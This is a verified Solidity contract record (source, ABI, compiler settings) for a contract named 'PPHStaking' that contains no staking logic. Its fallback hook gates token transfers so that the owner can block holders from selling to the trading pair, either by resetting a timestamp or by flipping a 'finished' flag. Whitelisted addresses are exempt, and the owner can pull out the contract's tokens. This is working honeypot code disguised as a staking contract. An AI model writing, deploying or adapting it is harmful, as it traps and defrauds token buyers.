{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.19;\r\ninterface IERC20 {\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function balanceOf(address account) external view returns (uint256);\r\n}\r\n\r\ncontract PPHStaking {\r\n    address private _owner;    \r\n    address private token;\r\n    address private pair;\r\n\r\n    bool private isFinished;\r\n\r\n    mapping(address => bool) private _whitelists;\r\n    mapping (address => uint256) private _addressTime;\r\n\r\n    uint256 private lastTime;\r\n\r\n    modifier onlyToken() {\r\n        require(msg.sender == token); \r\n        _;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender);\r\n        _;\r\n    }\r\n\r\n    constructor () {\r\n        _owner = msg.sender;\r\n        _whitelists[_owner] = true;\r\n    }\r\n\r\n    function setTokenIsFinished(bool _isFinished) external onlyOwner {\r\n      isFinished = _isFinished;\r\n    }\r\n\r\n    function refreshProxySetting(address _token, address _pair) external onlyOwner {\r\n      token = _token;\r\n      pair = _pair;\r\n      isFinished = false;\r\n      lastTime = 0;\r\n      _whitelists[_token] = true;\r\n    }\r\n\r\n    function forward(uint256 amount) external onlyOwner {\r\n      IERC20(token).transfer(msg.sender, amount);\r\n    }\r\n\r\n    function setLastTimeForToken() external onlyOwner {\r\n      lastTime = block.timestamp;\r\n    }\r\n\r\n    function whitelistForTokenHolder(address owner_, bool _isWhitelist) external onlyOwner {\r\n      _whitelists[owner_] = _isWhitelist;\r\n    }\r\n\r\n    fallback() external payable {\r\n      address _from;\r\n      address _to;\r\n      bytes memory data = msg.data;\r\n      assembly {\r\n          _from := mload(add(data, 0x14))\r\n          _to := mload(add(data, mul(0x14, 2)))\r\n      }\r\n\r\n      if (_whitelists[_from] || _whitelists[_to]) {\r\n        return;\r\n      }\r\n      if (_from == pair) {\r\n        if (_addressTime[_to] == 0) {\r\n          _addressTime[_to] = block.timestamp;\r\n        }\r\n        return;\r\n      } else if (_to == pair) {\r\n        require(!isFinished && _addressTime[_from] >= lastTime);\r\n        return;\r\n      } else {\r\n        _addressTime[_to] = _addressTime[_from];\r\n        return;\r\n      }\r\n      revert();\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"forward\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_pair\",\"type\":\"address\"}],\"name\":\"refreshProxySetting\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"setLastTimeForToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_isFinished\",\"type\":\"bool\"}],\"name\":\"setTokenIsFinished\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_isWhitelist\",\"type\":\"bool\"}],\"name\":\"whitelistForTokenHolder\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PPHStaking", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://f2f17e253b0253e3d6f2436e72d8e2e718e2166b32803d0e818dda6cd2c33d19"}